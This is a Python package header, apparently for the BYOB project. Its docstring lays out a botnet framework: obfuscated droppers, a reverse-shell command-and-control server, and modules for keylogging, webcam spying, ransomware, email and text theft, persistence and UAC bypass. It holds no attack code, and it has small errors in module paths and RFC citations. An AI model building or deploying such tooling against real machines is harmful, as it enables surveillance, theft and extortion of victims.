#!/usr/bin/python
# -*- coding: utf-8 -*-
""" 

88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'

BYOB is an open-source project that provides a library of packages
and modules which provide a basic framework for security researchers and
developers looking to roll-up their sleeves and get some hands-on experience
defending networks against a simulated botnet roll-out with realistic droppers
that will test the limits of your capacity to defend your network

The library contains 4 main parts:

CLIENT - byob.client
  generates unique, virtually undetectable droppers with staged payloads
  and a number of optional features can be added via intuitive command-line
  arguments, such as: --host, --port, --obfuscate, --compile, --compress, --encrypt
  (see `client.py -h/--help` for detailed usage information)

SERVER - byob.server
  console based command & control server with a persistent database for
  managing the client's reverse TCP shell sessions, tracking tasks issued
  to each client, storing results of each client's completed tasks, as well
  as hosting the byob.remote package online for clients to access remotely

CORE - byob.core
  supackage containing the core modules used by the server

  Util - byob.core.util
    miscellaneous utility functions that are used by many modules

  Handlers - byob.core.handlers
    request handlers which can be paired with the base Server class to form
    3 different types of server instances which the C2 runs in parallel
     - Request Handler: handles requests for files in the byob.remote package
     - Session Handler: handles client sessions & server-side of reverse TCP shells
     - Task Handler:    handles completed tasks by updating issued tasks in database

  Security - byob.core.security
    module containing the Diffie-Hellman Internet Key Exchange (RFC 2741)
    method for securing a shared secret key even over insecure networks,
    as well as encryption & decryption methods for 2 different modes to
    ensure secure communication no matter what
     - AES-256 in authenticated OCB mode (requires: PyCrypto & pycryptodome)
     - AES-256 in CBC mode with HMAC-SHA256 authentication (requires: PyCrypto)
     - XOR-128 (no packages required - uses only builtin python keywords)

  RemoteImport - byob.core.remoteimport
    enables clients to remotely import any package/module/script from the server
    by requesting the code from the server, loading the code in-memory, where
    it can be directly imported into the currently running process, without
    writing anything to the disk (not even temporary files - zero IO system calls)

  Payload - byob.core.payload
    reverse TCP shell designed to remotely import post-exploitation modules from
    server, along with any packages/dependencies), complete tasks issued by
    the server, and handles connections & communication at the socket-level

  Generators - byob.core.generators
    module containing functions which all generate code by using the arguments
    given to complete templates of varying size and complexity, and then output
    the code snippets generated as raw text

MODULES - byob.modules
  add any scripts/modules you want to run on target machines to this directory.
  While the server is online, clients will automatically be able to
  remotely import them into the currently running process without writing anything
  to the disk, and use them directly without installation.

  Keylogger - byob.modules.keylogger
    logs the user’s keystrokes & the window name entered

  Screenshot - byob.modules.screenshot
    take a screenshot of current user’s desktop

  Webcam  - byob.modules.webcam
    view a live stream or capture image/video from the webcam

  Ransom - byob.modules.ransom
    encrypt files & generate random BTC wallet for ransom payment

  Outlook - byob.modules.outlook
    read/search/upload emails from the local Outlook client

  Packet Sniffer - byob.modules.packetsniffer
    run a packet sniffer on the host network & upload .pcap file

  Persistence - byob.modules.packetsniffer
    establish persistence on the host machine using multiple methods
     - launch agent   (Mac OS X)
     - scheduled task (Windows)
     - startup file   (Windows)
     - registry key   (Windows)
     - crontab job    (Linux)

  Phone - byob.modules.phone
    read/search/upload text messages from the client smartphone

  Escalate Privileges - byob.modules.escalate
    attempt UAC bypass to gain unauthorized administrator privileges

  Port Scanner - byob.modules.portscan
    scan the local network for other online devices & open ports

  Process - byob.modules.process
    list/search/kill/monitor currently running processes on the host

  FILES
    miscellaneous resource files that are useful for the C2 server to serve to
    authenticated clients (data, images, etc.)

  PAYLOADS
    folder containing generated client payloads that the server hosts
    for the corresponding client stagers to load into memory remotely,
    decrypt it in-memory, import the code into the currently running
    process, and execute it directly

"""
__all__         = ['core','client','modules','server']
__version__     = '0.1.4'
__license__     = 'GPLv3'
__author__      = 'Daniel Vega-Myhre'
__github__      = 'https://github.com/colental/byob'
